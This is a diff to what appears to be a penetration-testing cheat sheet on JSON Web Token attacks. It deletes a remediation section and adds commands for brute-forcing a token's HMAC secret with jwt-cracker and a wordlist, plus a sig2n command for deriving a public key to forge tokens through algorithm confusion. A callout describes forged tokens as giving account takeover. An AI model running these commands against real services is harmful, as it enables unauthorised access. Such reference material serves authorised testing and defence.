@@ -49,10 +49,23 @@ python3 jwt_tool.py <token> -C -d rockyou.txt  # crack HMAC
 !!! loot "What forgery buys you"
     A forged token = instant privilege escalation and account takeover with no password. Check `role`, `isAdmin`, `sub`, `scope` claims.
 
-## :material-shield-check: Remediation
+## :material-key-variant: Cracking the HMAC secret
 
-- Pin the algorithm server-side; reject `none`. Use strong asymmetric keys.
-- Validate `jku`/`kid` against an allowlist; short token lifetimes + revocation.
+```bash
+# jwt-cracker — brute the symmetric key by alphabet + max length, or dictionary
+jwt-cracker -t <token> -a abcdefghijklmnopqrstuvwxyz --max 6
+jwt-cracker -t <token> -d rockyou.txt
+```
+
+## :material-key-plus: Recover the public key from two tokens
+
+When RS256→HS256 confusion needs the server's public key but you don't have it, derive
+a *usable* key from **two** captured tokens with PortSwigger's `sig2n`, then re-sign
+forged claims with each candidate:
+
+```bash
+docker run --rm -it portswigger/sig2n <token1> <token2>
+```
 
 ## :material-link-variant: Related
 
